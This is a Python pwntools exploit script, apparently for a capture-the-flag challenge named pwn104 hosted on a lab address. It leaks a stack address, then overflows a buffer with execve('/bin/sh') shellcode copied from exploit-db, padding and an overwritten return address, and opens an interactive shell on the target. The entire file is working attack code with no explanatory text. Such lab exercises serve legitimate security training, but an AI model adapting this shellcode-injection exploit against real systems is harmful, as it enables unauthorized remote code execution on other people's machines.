#!/usr/bin/python3

from pwn import *

local = True
filename = './pwn104.pwn104'
hostname = '10.10.220.183'
port = 9004
is_debug = False
eip_offset = 88

# shellcode from https://www.exploit-db.com/exploits/46907
shellcode = '\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'.encode('latin-1')

if local: 
    if is_debug:
        p = gdb.debug(filename, '''
        break *main+129
        continue
        ''')
    else:
        p = process(filename)
else:
    p = remote(hostname, port)

p.recvuntil("I'm waiting for you at ")
recved = p.recvline().decode()
print(recved)
eip = int(recved, 16)
print(f'Stack pointer at {hex(eip)}')

payload = shellcode
payload += b"A" * (eip_offset - len(shellcode))
payload += p64(eip)
p.sendline(payload)
p.interactive()

